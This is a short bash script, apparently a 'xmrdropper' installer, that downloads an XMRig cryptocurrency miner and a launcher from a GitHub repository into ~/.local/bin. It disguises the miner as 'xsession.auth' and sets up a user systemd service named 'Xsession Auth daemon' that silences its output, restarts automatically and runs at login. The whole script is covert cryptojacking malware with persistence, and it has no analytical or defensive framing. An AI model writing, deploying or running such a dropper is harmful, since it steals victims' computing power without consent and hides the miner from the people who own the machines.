#!/bin/bash

REPO_URL=https://github.com/freebyte/xmrdropper
XMRIG_URL=$REPO_URL/raw/master/xmrig
APP_URL=$REPO_URL/raw/master/Xsession.sh
LOCAL_PATH=$HOME/.local/bin
APPNAME=Xsession.sh
XMRIGNAME=xsession.auth
SYSTEMD_PATH=$HOME/.config/systemd/user


curl -sL --output $LOCAL_PATH/$APPNAME $APP_URL 
curl -sL --output $LOCAL_PATH/$XMRIGNAME $XMRIG_URL 

chmod +x $LOCAL_PATH/$APPNAME
chmod +x $LOCAL_PATH/$XMRIGNAME

mkdir -p $SYSTEMD_PATH
cat <<HEREDOC > $SYSTEMD_PATH/$APPNAME.service
[Unit] 
Description=Xsession Auth daemon

[Service]
ExecStart=$LOCAL_PATH/$APPNAME
StandardOutput=null
StandardError=null
Restart=always

[Install]
WantedBy=default.target

HEREDOC

systemctl --user daemon-reload
systemctl --user enable $APPNAME.service
systemctl --user start $APPNAME.service
